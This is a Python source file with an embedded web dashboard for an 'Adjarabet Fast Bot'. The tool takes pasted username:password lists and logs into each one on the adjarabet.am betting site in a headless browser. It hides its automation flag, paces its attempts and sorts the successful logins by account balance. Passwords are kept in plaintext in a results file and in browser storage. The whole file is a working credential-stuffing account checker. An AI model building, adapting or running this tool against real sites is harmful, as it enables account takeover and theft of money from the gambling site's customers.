import asyncio
import json
import logging
import re
import os
from datetime import datetime
from pathlib import Path
from typing import List, Dict, Optional
from dataclasses import dataclass
from enum import Enum

from fastapi import FastAPI, Request, WebSocket, WebSocketDisconnect
from fastapi.middleware.cors import CORSMiddleware
from fastapi.responses import JSONResponse, HTMLResponse
from playwright.async_api import async_playwright, TimeoutError as PlaywrightTimeout

# ================= OPTIMIZED CONFIG =================
CONFIG = {
    "port": int(os.getenv("PORT", 8000)),
    "host": os.getenv("HOST", "0.0.0.0"),
    "timeout_short": 3000,   # 3 seconds for quick checks
    "timeout_long": 7000,     # 7 seconds for login
    "delay_between": 0.3,     # 0.3 seconds between accounts
}

# ================= LOGGER =================
logging.basicConfig(
    level=logging.INFO,
    format="%(asctime)s | %(message)s",
    datefmt="%H:%M:%S"
)
logger = logging.getLogger("Bot")

# ================= MODELS =================
class AccountStatus(Enum):
    SUCCESS = "✅"
    FAILED = "❌"

@dataclass
class Account:
    username: str
    password: str
    status: AccountStatus = AccountStatus.FAILED
    balance: str = "0"
    error: str = ""
    
    def to_dict(self) -> Dict:
        return {
            "username": self.username,
            "password": self.password,
            "balance": self.balance,
            "status": self.status.value,
            "error": self.error[:50],
            "timestamp": datetime.now().strftime("%H:%M:%S")
        }

# ================= FAST BROWSER BOT =================
class FastBot:
    def __init__(self):
        self.playwright = None
        self.browser = None
        self.page = None
        self.is_running = False
        self.results = []
        
    async def start(self):
        """Start browser once"""
        try:
            self.playwright = await async_playwright().start()
            self.browser = await self.playwright.chromium.launch(
                headless=True,
                args=[
                    '--no-sandbox',
                    '--disable-setuid-sandbox',
                    '--disable-blink-features=AutomationControlled',
                    '--disable-dev-shm-usage',
                ]
            )
            self.page = await self.browser.new_page()
            self.is_running = True
            logger.info("🚀 Browser ready")
            return True
        except Exception as e:
            logger.error(f"Start failed: {e}")
            return False
    
    async def check_balance_fast(self, account: Account) -> tuple:
        """Very fast balance check - no navigation if already on site"""
        try:
            # Try to find balance element quickly
            balance_el = await self.page.wait_for_selector(
                '[data-test-id="header-user-balance"], .user-balance, .balance-amount, [class*="balance"]',
                timeout=CONFIG["timeout_short"]
            )
            if balance_el:
                text = await balance_el.inner_text()
                # Quick balance parsing
                numbers = re.findall(r'[\d,]+\.?\d*', text.replace(',', ''))
                if numbers:
                    val = float(numbers[0])
                    balance = f"{val:,.2f} ₾" if val > 0 else "0 ₾"
                    return balance, True
        except:
            pass
        return "0 ₾", False
    
    async def login_fast(self, account: Account) -> Account:
        """Ultra-fast login with minimal waits"""
        try:
            # Start time for monitoring
            start_time = datetime.now()
            
            # Go to login page directly (not homepage)
            await self.page.goto('https://www.adjarabet.am/hy/login', wait_until='domcontentloaded', timeout=CONFIG["timeout_long"])
            
            # Quick check if already logged in
            balance, logged_in = await self.check_balance_fast(account)
            if logged_in:
                account.balance = balance
                account.status = AccountStatus.SUCCESS
                logger.info(f"✅ {account.username} | {balance}")
                return account
            
            # Fill credentials quickly
            await self.page.fill('input[name="userIdentifier"]', account.username, timeout=CONFIG["timeout_short"])
            await self.page.fill('input[type="password"]', account.password, timeout=CONFIG["timeout_short"])
            
            # Click login
            await self.page.click('[data-test-id="header-login-button"], button[type="submit"]', timeout=CONFIG["timeout_short"])
            
            # Wait for navigation
            await self.page.wait_for_load_state('networkidle', timeout=CONFIG["timeout_long"])
            
            # Check balance after login
            balance, success = await self.check_balance_fast(account)
            if success:
                account.balance = balance
                account.status = AccountStatus.SUCCESS
                logger.info(f"✅ {account.username} | {balance} | {(datetime.now()-start_time).total_seconds():.1f}s")
            else:
                # Check for error message
                try:
                    error_text = await self.page.inner_text('[class*="error"], [class*="alert"]', timeout=1000)
                    if error_text:
                        account.error = error_text[:50]
                except:
                    pass
                account.error = account.error or "Login failed - wrong credentials?"
                logger.warning(f"❌ {account.username}: {account.error}")
                
        except PlaywrightTimeout as e:
            account.error = "Timeout"
            logger.warning(f"⏰ {account.username}: timeout")
        except Exception as e:
            account.error = str(e)[:40]
            logger.error(f"❌ {account.username}: {account.error}")
        
        return account
    
    async def process_batch(self, accounts: List[Account], manager):
        """Process all accounts fast"""
        self.results = []
        total = len(accounts)
        
        logger.info(f"📊 Processing {total} accounts")
        await manager.broadcast(f"PROGRESS:0/{total}")
        
        for i, account in enumerate(accounts):
            if not self.is_running:
                break
            
            # Process single account
            result = await self.login_fast(account)
            self.results.append(result)
            
            # Send update
            await manager.broadcast(f"RESULT:{json.dumps(result.to_dict())}")
            await manager.broadcast(f"PROGRESS:{i+1}/{total}")
            
            # Small delay between accounts
            if i < total - 1:
                await asyncio.sleep(CONFIG["delay_between"])
        
        # Save results
        self._save_results()
        
        # Summary
        success = sum(1 for r in self.results if r.status == AccountStatus.SUCCESS)
        logger.info(f"✨ Complete: ✅{success} ❌{total-success} ({success/total*100:.0f}%)")
        await manager.broadcast(f"SUMMARY:{success}/{total}")
    
    def _save_results(self):
        try:
            Path("results").mkdir(exist_ok=True)
            with open("results/latest.json", "w") as f:
                json.dump([r.to_dict() for r in self.results], f, indent=2)
        except:
            pass
    
    async def get_results(self):
        if self.results:
            return [r.to_dict() for r in self.results]
        try:
            with open("results/latest.json", "r") as f:
                return json.load(f)
        except:
            return []
    
    async def stop(self):
        self.is_running = False
        if self.page:
            await self.page.close()
        if self.browser:
            await self.browser.close()
        if self.playwright:
            await self.playwright.stop()

# ================= FASTAPI with WebSocket =================
manager = None
bot = None
processing_task = None

def create_app():
    global manager, bot
    manager = ConnectionManager()
    bot = FastBot()
    
    app = FastAPI()
    app.add_middleware(CORSMiddleware, allow_origins=["*"], allow_methods=["*"])
    
    # HTML (simplified but functional)
    @app.get("/")
    async def root():
        return HTMLResponse(get_html())
    
    @app.post("/start")
    async def start_bot(request: Request):
        global processing_task
        body = (await request.body()).decode()
        
        accounts = []
        for line in body.splitlines():
            line = line.strip()
            if line and ':' in line and not line.startswith('#'):
                # Handle both colon types
                line = line.replace('։', ':')
                parts = line.split(':', 1)
                if len(parts) == 2 and parts[0].strip() and parts[1].strip():
                    accounts.append(Account(parts[0].strip(), parts[1].strip()))
        
        if not accounts:
            return JSONResponse({"error": "No valid accounts - use username:password"}, status_code=400)
        
        if processing_task and not processing_task.done():
            processing_task.cancel()
            try:
                await processing_task
            except:
                pass
        
        processing_task = asyncio.create_task(bot.process_batch(accounts, manager))
        return {"status": "started", "total": len(accounts)}
    
    @app.post("/stop")
    async def stop_bot():
        global processing_task
        bot.is_running = False
        if processing_task:
            processing_task.cancel()
        await manager.broadcast("STATUS:stopped")
        return {"status": "stopped"}
    
    @app.get("/results")
    async def get_results():
        return await bot.get_results()
    
    @app.websocket("/ws")
    async def websocket_endpoint(websocket: WebSocket):
        await manager.connect(websocket)
        try:
            while True:
                await asyncio.wait_for(websocket.receive_text(), timeout=60)
        except:
            manager.disconnect(websocket)
    
    return app

class ConnectionManager:
    def __init__(self):
        self.active_connections = []
    
    async def connect(self, websocket: WebSocket):
        await websocket.accept()
        self.active_connections.append(websocket)
    
    def disconnect(self, websocket):
        if websocket in self.active_connections:
            self.active_connections.remove(websocket)
    
    async def broadcast(self, message: str):
        for conn in self.active_connections[:]:
            try:
                await conn.send_text(message)
            except:
                self.disconnect(conn)

def get_html():
    return '''<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Adjarabet Fast Bot</title>
    <style>
        * { margin:0; padding:0; box-sizing:border-box; }
        body { background:#0a0c10; color:#e6edf3; font-family: system-ui, -apple-system, sans-serif; padding: 20px; }
        .container { max-width: 1400px; margin: 0 auto; }
        .header { background: linear-gradient(135deg, #161b22, #0d1117); border-radius: 16px; padding: 20px; margin-bottom: 20px; border: 1px solid #30363d; }
        .stats { display: grid; grid-template-columns: repeat(3, 1fr); gap: 15px; margin-bottom: 20px; }
        .stat-card { background: #161b22; border-radius: 12px; padding: 15px; text-align: center; border: 1px solid #30363d; cursor: pointer; }
        .stat-number { font-size: 32px; font-weight: bold; color: #58a6ff; }
        .stat-label { font-size: 12px; color: #8b949e; margin-top: 5px; }
        .grid { display: grid; grid-template-columns: 1fr 1fr; gap: 20px; margin-bottom: 20px; }
        .card { background: #161b22; border-radius: 16px; border: 1px solid #30363d; overflow: hidden; }
        .card-header { padding: 15px 20px; background: #0d1117; border-bottom: 1px solid #30363d; font-weight: 600; }
        textarea { width: 100%; height: 300px; background: #0d1117; border: 1px solid #30363d; border-radius: 8px; padding: 15px; color: #e6edf3; font-family: monospace; font-size: 12px; resize: vertical; }
        .btn { padding: 10px 20px; border: none; border-radius: 8px; font-weight: 600; cursor: pointer; margin-right: 10px; }
        .btn-primary { background: #238636; color: white; }
        .btn-primary:hover { background: #2ea043; }
        .btn-danger { background: #da3633; color: white; }
        .log { background: #010409; border-radius: 8px; height: 300px; overflow-y: auto; padding: 12px; font-family: monospace; font-size: 11px; }
        .log-line { padding: 4px 0; border-bottom: 1px solid #21262d; }
        .table-container { max-height: 500px; overflow-y: auto; }
        table { width: 100%; border-collapse: collapse; }
        th, td { padding: 10px 12px; text-align: left; border-bottom: 1px solid #21262d; font-size: 13px; }
        th { background: #0d1117; cursor: pointer; position: sticky; top: 0; }
        .balance-positive { color: #3fb950; font-weight: 600; }
        .progress-bar { height: 3px; background: #21262d; margin-top: 15px; border-radius: 3px; overflow: hidden; }
        .progress-fill { height: 100%; background: linear-gradient(90deg, #3fb950, #58a6ff); width: 0%; transition: width 0.3s; }
        .filter-group { display: flex; gap: 8px; padding: 12px 16px; flex-wrap: wrap; }
        .filter-btn { padding: 5px 14px; background: #21262d; border: none; border-radius: 20px; color: #8b949e; cursor: pointer; font-size: 12px; }
        .filter-btn.active { background: #58a6ff; color: white; }
        .search { padding: 6px 14px; background: #0d1117; border: 1px solid #30363d; border-radius: 20px; color: white; width: 200px; }
        @media (max-width: 768px) { .grid { grid-template-columns: 1fr; } }
    </style>
</head>
<body>
<div class="container">
    <div class="header">
        <h2>🎮 Adjarabet Bot <span style="font-size: 12px; color: #8b949e;">Fast</span></h2>
        <div class="progress-bar"><div class="progress-fill" id="progressFill"></div></div>
    </div>
    
    <div class="stats">
        <div class="stat-card" onclick="setFilter('all')"><div class="stat-number" id="totalCount">0</div><div class="stat-label">TOTAL</div></div>
        <div class="stat-card" onclick="setFilter('success')"><div class="stat-number" id="successCount">0</div><div class="stat-label">✅ SUCCESS</div></div>
        <div class="stat-card" onclick="setFilter('failed')"><div class="stat-number" id="failedCount">0</div><div class="stat-label">❌ FAILED</div></div>
    </div>
    
    <div class="grid">
        <div class="card">
            <div class="card-header">📝 Accounts (username:password)</div>
            <div style="padding: 20px;">
                <textarea id="accounts" placeholder="user1:pass123&#10;user2:pass456"></textarea>
                <div style="margin-top: 15px;">
                    <button class="btn btn-primary" onclick="startBot()">▶ START</button>
                    <button class="btn btn-danger" onclick="stopBot()">⏹ STOP</button>
                </div>
            </div>
        </div>
        
        <div class="card">
            <div class="card-header">📡 Live Log</div>
            <div class="log" id="log"><div class="log-line">● Bot ready - Fast mode</div></div>
        </div>
    </div>
    
    <div class="card">
        <div class="card-header">📊 Results</div>
        <div class="filter-group">
            <input type="text" id="search" class="search" placeholder="Search...">
            <button class="filter-btn active" data-filter="all" onclick="setFilter('all')">All</button>
            <button class="filter-btn" data-filter="success" onclick="setFilter('success')">✅ Success</button>
            <button class="filter-btn" data-filter="failed" onclick="setFilter('failed')">❌ Failed</button>
        </div>
        <div class="table-container">
            <table>
                <thead><tr><th onclick="sortBy('status')">Status</th><th onclick="sortBy('username')">Username</th><th>Password</th><th onclick="sortBy('balance')">Balance</th><th>Error</th></tr></thead>
                <tbody id="results"><tr><td colspan="5" style="text-align:center; padding:40px;">Ready - Click Start</td></tr></tbody>
            </table>
        </div>
    </div>
</div>

<script>
let ws = null, results = [], currentFilter = 'all', sortField = 'balance', sortDir = 'desc';

function connect() {
    ws = new WebSocket(`ws://${location.host}/ws`);
    ws.onopen = () => addLog('🟢 Connected');
    ws.onmessage = (e) => {
        let d = e.data;
        if (d.startsWith('RESULT:')) {
            let r = JSON.parse(d.slice(7));
            let idx = results.findIndex(x => x.username === r.username);
            if (idx >= 0) results[idx] = r;
            else results.push(r);
            renderResults();
            updateStats();
            addLog(`${r.status} ${r.username} | ${r.balance}`);
        } else if (d.startsWith('PROGRESS:')) {
            let p = d.slice(9).split('/');
            document.getElementById('progressFill').style.width = (p[0]/p[1]*100) + '%';
        } else if (d.startsWith('SUMMARY:')) {
            addLog('📊 ' + d.slice(8));
        } else if (!d.startsWith('STATUS:')) {
            addLog(d);
        }
    };
    ws.onclose = () => setTimeout(connect, 3000);
}

function renderResults() {
    let filtered = results.filter(r => {
        if (currentFilter === 'all') return true;
        if (currentFilter === 'success') return r.status === '✅';
        if (currentFilter === 'failed') return r.status === '❌';
        return true;
    });
    let search = document.getElementById('search')?.value.toLowerCase() || '';
    filtered = filtered.filter(r => r.username.toLowerCase().includes(search));
    filtered.sort((a,b) => {
        let av = sortField === 'balance' ? (parseFloat(a.balance) || 0) : (a[sortField] || '');
        let bv = sortField === 'balance' ? (parseFloat(b.balance) || 0) : (b[sortField] || '');
        return sortDir === 'asc' ? (av > bv ? 1 : -1) : (av < bv ? 1 : -1);
    });
    document.getElementById('results').innerHTML = filtered.map(r => `
        <tr>
            <td style="font-size:18px">${r.status}</td>
            <td><strong style="color:#58a6ff">${escapeHtml(r.username)}</strong></td>
            <td><span style="font-family:monospace">${escapeHtml(r.password)}</span></td>
            <td class="${(parseFloat(r.balance)||0) > 0 ? 'balance-positive' : ''}">${r.balance || '0'}</td>
            <td style="color:#8b949e;font-size:11px">${escapeHtml(r.error || '-')}</td>
        </tr>
    `).join('');
}

function updateStats() {
    document.getElementById('totalCount').innerText = results.length;
    document.getElementById('successCount').innerText = results.filter(r => r.status === '✅').length;
    document.getElementById('failedCount').innerText = results.filter(r => r.status === '❌').length;
}

function addLog(msg) {
    let log = document.getElementById('log');
    let div = document.createElement('div');
    div.className = 'log-line';
    div.innerHTML = `<span style="color:#6e7681">[${new Date().toLocaleTimeString()}]</span> ${msg}`;
    log.appendChild(div);
    div.scrollIntoView();
    if (log.children.length > 300) log.removeChild(log.firstChild);
}

function setFilter(f) { currentFilter = f; document.querySelectorAll('.filter-btn').forEach(b => b.classList.toggle('active', b.dataset.filter === f)); renderResults(); }
function sortBy(f) { if (sortField === f) sortDir = sortDir === 'asc' ? 'desc' : 'asc'; else { sortField = f; sortDir = f === 'balance' ? 'desc' : 'asc'; } renderResults(); }
function escapeHtml(s) { if (!s) return ''; return s.replace(/[&<>]/g, m => ({'&':'&amp;','<':'&lt;','>':'&gt;'})[m]); }

async function startBot() {
    let acc = document.getElementById('accounts').value;
    if (!acc.trim()) { addLog('❌ Enter accounts first'); return; }
    addLog('🚀 Starting...');
    let res = await fetch('/start', { method: 'POST', body: acc });
    let data = await res.json();
    if (data.status === 'started') addLog(`✓ Started: ${data.total} accounts`);
    else addLog(`❌ ${data.error || 'Failed'}`);
}

async function stopBot() { await fetch('/stop', { method: 'POST' }); addLog('⏹ Stopping...'); }

// Load saved accounts
document.getElementById('accounts').value = localStorage.getItem('accounts') || '';
document.getElementById('accounts').addEventListener('input', () => localStorage.setItem('accounts', document.getElementById('accounts').value));
document.getElementById('search').addEventListener('input', () => renderResults());

connect();
setInterval(async () => {
    try {
        let r = await fetch('/results');
        let d = await r.json();
        if (d.length > results.length) { results = d; renderResults(); updateStats(); }
    } catch(e) {}
}, 3000);
</script>
</body>
</html>'''

# ================= MAIN =================
if __name__ == "__main__":
    import uvicorn
    
    Path("results").mkdir(exist_ok=True)
    
    print("\n" + "=" * 50)
    print("🎮 ADJARABET FAST BOT")
    print("=" * 50)
    print(f"📍 http://{CONFIG['host']}:{CONFIG['port']}")
    print(f"⚡ Timeout: {CONFIG['timeout_long']}ms, Delay: {CONFIG['delay_between']}s")
    print("💡 Direct login page, no extra waits")
    print("=" * 50 + "\n")
    
    app = create_app()
    
    @app.on_event("startup")
    async def startup():
        await bot.start()
    
    @app.on_event("shutdown")
    async def shutdown():
        await bot.stop()
    
    uvicorn.run(app, host=CONFIG["host"], port=CONFIG["port"], log_level="warning")
